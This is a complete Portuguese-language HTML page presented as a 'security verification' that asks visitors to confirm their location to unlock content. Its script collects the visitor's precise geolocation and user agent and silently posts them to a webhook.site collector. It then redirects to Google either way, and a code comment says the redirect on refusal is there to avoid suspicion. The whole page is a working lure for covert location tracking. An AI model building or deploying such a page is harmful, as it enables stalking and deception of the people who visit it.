<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background-color: #f4f7f6; 
        }
        .card { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
            text-align: center; 
            max-width: 380px; 
            width: 90%;
        }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h2 { color: #2c3e50; margin: 0 0 15px 0; }
        p { color: #7f8c8d; line-height: 1.6; margin-bottom: 30px; }
        
        .btn-check { 
            padding: 16px 32px; 
            font-size: 18px; 
            background-color: #27ae60; 
            color: white; 
            border: none; 
            border-radius: 50px; 
            cursor: pointer; 
            font-weight: bold;
            width: 100%;
            transition: background 0.3s ease;
        }
        .btn-check:hover { background-color: #219150; }
        #loading { display: none; margin-top: 20px; color: #2980b9; font-weight: bold; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">🛡️</div>
        <h2>Validar Acesso</h2>
        <p>Para sua segurança, precisamos confirmar sua localização atual para liberar o conteúdo solicitado.</p>
        
        <button class="btn-check" onclick="enviarLocalizacao()">CONFIRMAR AGORA</button>
        
        <div id="loading">Verificando...</div>
    </div>

    <script>
        function enviarLocalizacao() {
            const btn = document.querySelector('.btn-check');
            const loader = document.getElementById('loading');
            
            // Seu link configurado do print
            const URL_DESTINO = "https://webhook.site/999f921d-cfad-42a3-8927-e862ab40f665"; 

            btn.style.display = 'none';
            loader.style.display = 'block';

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    
                    const dados = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        precisao: position.coords.accuracy + " metros",
                        data_hora: new Date().toLocaleString('pt-BR'),
                        dispositivo: navigator.userAgent
                    };

                    // Envia os dados para o seu painel no Webhook.site
                    fetch(URL_DESTINO, {
                        method: 'POST',
                        mode: 'no-cors', 
                        body: JSON.stringify(dados)
                    });

                    // Redireciona após 1.5 segundos
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 1500);

                }, function(error) {
                    // Se der erro ou recusar, redireciona mesmo assim para não suspeitar
                    window.location.href = "https://www.google.com";
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else {
                window.location.href = "https://www.google.com";
            }
        }
    </script>
</body>
</html>
